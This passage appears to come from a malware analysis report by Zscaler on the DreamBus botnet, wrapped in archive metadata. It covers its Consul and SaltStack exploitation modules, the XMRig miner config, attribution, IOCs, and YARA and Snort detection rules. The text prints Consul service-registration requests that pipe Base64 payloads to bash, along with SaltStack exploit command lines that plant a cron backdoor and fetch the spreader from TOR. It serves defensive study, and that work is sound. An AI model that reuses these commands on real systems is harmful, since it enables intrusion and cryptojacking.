%s:%d\nUser-Agent: consul-api-c\nContent-Type: application/json\nContent-Length: %d\n{\"ID\": \"systemd-service\",\"Name\": \"systemd-service\",\"Address\": \"127.0.0.1\",\"Port\":\n8500,\"check\":{\"Args\": [\"sh\",\"-c\",\"echo WFJBTkRPTQpleGVjICY+L2Rldi...\n[snip]...UvZGVyZWdpc3Rlci9zeXN0ZW1kLXNlcnZpY2U7ZG9uZQpjb25zdWwgc2VydmljZXMgZGVyZWdpc3R\n -d|bash\"],\"Interval\": \"120s\"}}\n\n```\nThe fourth registration request is identical to the second registration request, with the TTL\nfield replaced with the Interval field.\n```\nPUT /v1/agent/service/register HTTP/1.1\nHost: %s:%d\nUser-Agent: consul-api-c\nContent-Type: application/json\nContent-Length: %d\n{\"ID\": \"systemd-service\",\"Name\": \"systemd-service\",\"Address\": \"127.0.0.1\",\"Port\":\n8500,\"check\":{\"script\": \"echo WFJBTkRPTQpleGVjICY+L2Rldi...\n[snip]...UvZGVyZWdpc3Rlci9zeXN0ZW1kLXNlcnZpY2U7ZG9uZQpjb25zdWwgc2VydmljZXMgZGVyZWdpc3R\n -d|bash\",\"Interval\": \"120s\"}}\n\n```\nAfter sending these four registration requests, the DreamBus Consul module will call the\n_deregister command once again with the same parameters as described previously to clean_\nitself up.\n\n[HashiCorp has published an advisory about the conditions, in which this vulnerability can be](https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations)\ntriggered, as well as guidance to secure a Consul instance.\n\n## DreamBus SaltStack module\n\n[The most recent DreamBus module observed by Zscaler ThreatLabZ targets SaltStack,](https://www.saltstack.com/)\nwhich is a Python-based open source IT automation framework. The module exploits CVE2020-11651, which is an authentication bypass that results in full remote command execution\nas root. [This exploit was originally described by F-Secure, who found that there were 6,000](https://labs.f-secure.com/advisories/saltstack-authorization-bypass)\nSaltStack servers that were exposed to the internet, and therefore, potentially vulnerable.\n\nThe DreamBus module performs an initial check to make sure that /usr/bin/curl and\n/usr/bin/python3 exist on the system and are executable. If they are not present, the module\nwill exit. The module then scans for SaltStack servers on port 4506 on private subnets and\nthe internet ranges 1.0.0.0/8 – 222.0.0.0/8\n```\nGET / HTTP/1.1\nHost: 127.0.0.1\n\n```\nThe module checks if the server responds with the bytes ff 00 00 00 00 00 00 00 01 7f.\nThese bytes are representative of the ZeroMQ protocol that is used by SaltStack.\n\n\n-----\n\nIf successful, the module will execute a series of commands. It will first create a directory\nunder /tmp/.salted/ and write a Base64-encoded shell script named x.pe to this directory and\nexecute it. This script performs a variety of actions. A Base64-encoded string is decoded and\nwritten to e.py. This is a Python script that contains a copy of an open source proof-ofconcept exploit for this vulnerability. Another shell script is created with the name x.px in the\n/tmp/.salted/ directory. This script contains the code to download the main DreamBus\nspreader from a hardcoded TOR domain with the path /st.<arch> if the exploit is successful.\nIt will also attempt to delete the files /etc/cron.d/tmp00 and /tmp/.systemd-salt. The script\nthen writes the following lines for a cron job to a file named x.pa.\n```\n* * * * * root /bin/bash /tmp/.systemd-salt\n\n```\nNext, two shell commands attempt to install the Python packages: msgpack and pyzmq.\nThese packages are dependencies required by the Python-based exploit script that launches\nthe exploit. The Dreambus module launches the exploit three times with the following\ncommand lines:\n```\npython3 e.py -p 4506 -w /tmp/.systemd-salt -f ./x.px $1\npython3 e.py -p 4506 -w /etc/cron.d/tmp00 -f ./x.pa $1\npython3 e.py -p 4506 -c \"echo WFJBTkRPTQpleGVjICY…[snip]...G9uZQo=|base64 -d|bash\" -m\n$1\n\n```\nThe first and second command launch the Python exploit script e.py with the same\nparameters: the port number of the SaltStack server (with the -p option), the file from the Salt\nMaster to write (with the -w option), the content of the file to write (with the -f option), and the\nIP address of the server to target. The differences between the two commands are that the\nfirst command writes the content of the file x.px to /tmp.systemd-salt, while the second\ncommand writes the content of the file x.pa to /etc/cron.d/tmp00. This allows DreamBus to\nestablish persistence on the compromised SaltStack server.\n\nThe third command launches the exploit script with the port, a command to execute (with the\n-c option), a flag to run the command on all active minions (with the -m option), and the IP\naddress of the SaltStack server. The command consists of the same Base64 encoded\ncontent as the file x.px that downloads the main Dreambus spreader module.\n\nFinally, the files e.py (the Python-based exploit script), x.pa (the temporary cron job), x.pe\n(the main Base64 encoded shell script), and x.px (main spreader module script) are deleted\nto hide the exploitation.\n\n## Additional DreamBus modules\n\nPrior open source reporting has also identified modules that have been deployed by\n[DreamBus that target Apache Fink and](https://twitter.com/JiaYu_521/status/1152132886465638401) [Jenkins.](https://twitter.com/JiaYu_521/status/1263389123554848768)\n\n## DreamBus XMRig Monero miner module\n\n\n-----\n\nThe current monetization vector for DreamBus is through mining a cryptocurrency known as\nMonero (XMR), which is a popular alternative to Bitcoin due to its improvements in\nanonymity. At the time of publication, the value of Monero is up over 100 percent in the past\nyear, further increasing the threat actor’s profits.\n\n[To mine Monero, DreamBus downloads an XMRig module through the /cpu command. The](https://github.com/xmrig/xmrig)\nXMRig module is compiled regularly with the most recent version, XMRig 6.7.1, built on\nJanuary 15, 2021. The XMRig configuration specifies a mining pool to use the infected\nsystem’s CPU to mine Monero cryptocurrency. An example hardcoded configuration is shown\nbelow:\n\n\n-----\n\n```\n{\n  \"api\": {\n    \"id\": null,\n    \"worker-id\": null\n  },\n  \"http\": {\n    \"enabled\": false,\n    \"host\": \"127.0.0.1\",\n    \"port\": 0,\n    \"access-token\": null,\n    \"restricted\": true\n  },\n  \"autosave\": true,\n  \"version\": 1,\n  \"background\": true,\n  \"colors\": true, [snip]\n  \"cpu\": {\n    \"enabled\": true,\n    \"huge-pages\": true,\n    \"huge-pages-jit\": false,\n    \"hw-aes\": null,\n    \"priority\": null,\n    \"memory-pool\": false,\n    \"yield\": true,\n    \"max-threads-hint\": 100,\n    \"asm\": true,\n    \"argon2-impl\": null,\n    \"astrobwt-max-size\": 550,\n    \"cn/0\": false,\n    \"cn-lite/0\": false,\n    \"kawpow\": false\n  }, [snip]\n  \"donate-level\": 5,\n  \"donate-over-proxy\": 1,\n  \"log-file\": null,\n  \"pools\": [\n    {\n      \"algo\": null,\n      \"coin\": \"monero\",\n      \"url\": \"164.132.105.114:8080\",\n      \"user\": \"x\",\n      \"pass\": \"x\",\n      \"rig-id\": null,\n      \"nicehash\": true,\n      \"keepalive\": true,\n      \"enabled\": true,\n      \"tls\": false,\n      \"tls-fingerprint\": null,\n      \"daemon\": false,\n      \"self-select\": null\n    [snip]\n  ],\n  \"print-time\": 60,\n  \"health-print-time\": 60,\n  \"retries\": 5,\n\n```\n\n-----\n\n```\n  retry pause : 5,\n  \"syslog\": false,\n  \"user-agent\": null,\n  \"watch\": true,\n  \"pause-on-battery\": false\n}\n\n## Attribution\n\n```\nThe threat actor behind DreamBus is likely located in or near Russia based on the time when\nnew commands are pushed out. Updates and new commands are issued that typically start\naround 6:00 a.m. UTC or 9:00 a.m. Moscow Standard Time (MSK) and end approximately at\n3:00 p.m. UTC or 6:00 p.m. MSK.\n\n## Conclusion\n\nWhile DreamBus is currently used for mining cryptocurrency, the threat actor could pivot to\nmore disruptive activities such as ransomware. In addition, other threat groups could\nleverage the same techniques to infect systems and compromise sensitive information that\ncan be stolen and easily monetized. The DreamBus threat actor continues to innovate and\nadd new modules to compromise more systems, and regularly pushes out updates and bug\nfixes. The threat actor behind DreamBus is likely to continue activity for the foreseeable\nfuture hidden behind TOR and anonymous file-sharing websites. Therefore, organizations\nmust be vigilant and take the necessary precautions to prevent infections.\n\nThere are a number of best practices that organizations can take to prevent attacks. These\ninclude properly securing all applications that are both publicly and privately accessible.\nStrong passwords should always be used to secure internet services, and SSH public key\nauthentication can be further strengthened by requiring a password to decrypt the private\nkey. Organizations should also deploy network and endpoint monitoring systems to identify\ncompromises and be mindful of systems that engage in bruteforce attacks, which are\ntypically very noisy.\n\n## Detections\n\nZscaler’s multilayered cloud security platform detects indicators at various levels, as shown\nbelow:\n\n[ELF32.Coinminer.DreamBus](https://threatlibrary.zscaler.com/threats/a182a80f-2ecb-4896-a83e-5ccb542fb807)\n\n[ELF32.Coinminer.XMRig](https://threatlibrary.zscaler.com/threats/8bfc4167-256a-4ab2-acae-30f07153dbf4)\n\n[Linux.Worm.SSHSpreader](https://threatlibrary.zscaler.com/threats/5f9ec34b-5577-4a8f-be46-71ef9d432622)\n\n## MITRE ATT&CK Table\n\n\n-----\n\nTactic Technique\n\nT1133 External Remote Services\n\nT1090 Proxy\n\nT1110 Brute Force\n\nT1190 Exploit Public-Facing Application\n\nT1210 Exploitation of Remote Services\n\nT1078 Valid Accounts\n\nT1552 Unsecured Credentials\n\nT1592 Gather Victim Host Information\n\nT0011 Command and Control\n\nT1053 Scheduled Task/Job\n\nT1496 Resource Hijacking\n\n## Indicators of Compromise (IOCs)\n\nThe following IOCs can be used to detect a DreamBus infection.\n\n**Samples**\n\nSHA256 Hash Module\nName\n\ne78fc101133d1803cd462b68058c5c238f56b1fe9416e5997cfe7d44947092a2 PostgreSQL\nSpreader\nx86\n\n\n-----\n\n2556c8cedd6f0ff7d16be9093bbfd0e86ede3e47fab13dfeb8d3964f10b18ea4 PostgreSQL\nSpreader\nx64\n\n0e726a4fff8efeff3fdd127bed6ed28d5f51ff2c4f1e40a267984f7edae8e7d3 Apache\nSpark\nSpreader\nx64\n\n636accbee3f2163945886fa8f68c74449eb3d54769a1747728197e7804339b91 HashiCorp\nConsul\nSpreader\nx64\n\nf0ded99a521dc8be2b331fe7cdfff56d428ba3a4882d25eac9b7f7b9cefeea3d Hadoop\nYARN\nSpreader\nx64\n\n33b0b3649faa07f9b62727f24a09ee5edc6b0ffc00e1a57633166abf7783fc7b SaltStack\nSpreader\nx64\n\naa38ca6252eee5c7a2cb51a7a2fe8b2660145ca5717f462ca83248bec5929608 XMRig\nMiner x64\n\n378253939be1eded3fc70c70d8d8471b90e4a8da917bc2ed412175e906555673 Redis\nSpreader\nx64 (Auth)\n\n71efa6b7dafc8c6af2aa5579f0358161308c56a3a6c3b947f53410415675e261 Redis\nSpreader\nx64 (No\nAuth)\n\n8f82943f33ab4dd5979b7654d0402e256334c96d962d13de1bddebb9bc54f994 Main\nSpreader\nx64\n\n030c5dec24dc8fafff71dc4f0b68ef80b23bd1a276cd76c9530e26ac1e273412 SSH\nSpreader\nTAR file\n\n\n-----\n\n**Network Indicators**\n\nDomain / IP Address Description\n\ndreambusweduybcp.onion TOR domain\nfor\ncommands\n\nqsts2vqotnlh2h5xwa7fp3iopb7h7cngknjjo4f4sxhrwcqgughipxid.onion TOR domain\nfor modules\n\ni62hmnztfpzwrhjg34m6ruxem5oe36nulzmxcgbdbkiaceubprkta7ad.onion TOR domain\nfor modules\n\nnssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.onion TOR domain\nfor modules\n\nojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.onion TOR domain\nfor modules\n\nji55jjplpknk7eayxxtb5o3ulxuevntutsdanov5dp3wya7l7btjv4qd.onion TOR domain\nfor modules\n\nbggts547gukhvmf4cgandlgxxphengxovoyo6ewhns5qmmb2b5oi43yd.onion TOR domain\nfor modules\n\n4iucigxvlfx4vcqn5sordersaa3a3ztjcaoszptxxo5b3pbn6nlwsfad.onion TOR domain\nfor modules\n\nsg722jwocbvedckhd4dptpqfek5fsbmx3v57qg6lzhuo56np73mb3zyd.onion TOR domain\nfor modules\n\n25wlksd35c2fs55rnhlcfz3jjaujxmbmfkvrxeu7tkgnnesdhh3gghqd.onion TOR domain\nfor modules\n\n164.132.105.114 Monero\nmining pool\n\n136.243.90.99 Monero\nmining pool\n\n\n-----\n\n94.176.237.229 Monero\nmining pool\n\n153.127.216.132 Monero\nmining pool\n\n94.237.85.89 Hosts various\nDreamBus\ncomponents\n\n**Host Indicators**\n\nFilenames Description\n\n.systemd-service.sh Main Spreader Script\n\nsystemd-service.sh Main Spreader Script\n\n0systemd-service Main Spreader Script\n\n/tmp/.X11-unix/sshd DreamBus SSH bruteforce spreader module TAR file\n\n/tmp/.X11-unix/01 DreamBus main module lock file\n\n/tmp/.X11-unix/22 DreamBus module lock file\n\n/etc/cron.d/systemdd DreamBus Redis module cron\n\n/etc/cron.d/tmp00 DreamBus SaltStack module cron\n\n/tmp/.salted/ DreamBus SaltStack exploit temporary directory\n\n/tmp/.systemd-salt DreamBus SaltStack backdoor\n\n\n-----\n\n**Yara rules**\n\nThese rules are valid on unpacked DreamBus binaries.\n```\nrule dreambus_module\n{\n strings:\n  $ = \"/tmp/.X11-unix/22\"\n  $ = \"172.16.0.0/12\"\n  $ = \"192.168.0.0/16\"\n  $ = \"10.0.0.0/8\"\n condition:\n  all of them\n}\nrule dreambus_main\n{\n strings:\n  $ = \"/tmp/.X11-unix/01\"\n  $ = \"/dev/null\"\n  $ = {2D 63 00 2F 62 69 6E 2F 73 68 00}\n  $ = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n condition:\n  all of them\n}\n\n```\n**Snort rules**\n```\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"Zscaler TROJAN DreamBus Command\nRequest\"; flow:established,to_server; content:\"GET\"; http_method; content:\"/cmd\";\nhttp_uri; content:\"User-Agent: -\"; http_header; classtype:trojan-activity; rev:1;)\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"Zscaler TROJAN DreamBus Command\nRequest\"; flow:established,to_server; content:\"GET\"; http_method; content:\"/trc\";\nhttp_uri; content:\"User-Agent: -\"; http_header; classtype:trojan-activity; rev:1;)\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"Zscaler TROJAN DreamBus Beacon\nRequest\"; flow:established,to_server; content:\"GET\"; http_method; content:\"/bot\";\nhttp_uri; content:\"User-Agent: -\"; http_header; classtype:trojan-activity; rev:1;)\nalert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"Zscaler TROJAN DreamBus XMRig\nRequest\"; flow:established,to_server; content:\"GET\"; http_method; content:\"/cpu\";\nhttp_uri; content:\"User-Agent: -\"; http_header; classtype:trojan-activity; rev:1;)\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-22 - DreamBus Botnet - Technical Analysis.pdf"
    ],
    "report_names": [
        "2021-01-22 - DreamBus Botnet - Technical Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535986,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653779274,
    "ts_modification_date": 1653779274,
    "files": {
        "pdf": "https://archive.orkl.eu/fe406221165a7ce679bf67742462a3f17b34187e.pdf",
        "text": "https://archive.orkl.eu/fe406221165a7ce679bf67742462a3f17b34187e.txt",
        "img": "https://archive.orkl.eu/fe406221165a7ce679bf67742462a3f17b34187e.jpg"
    }
}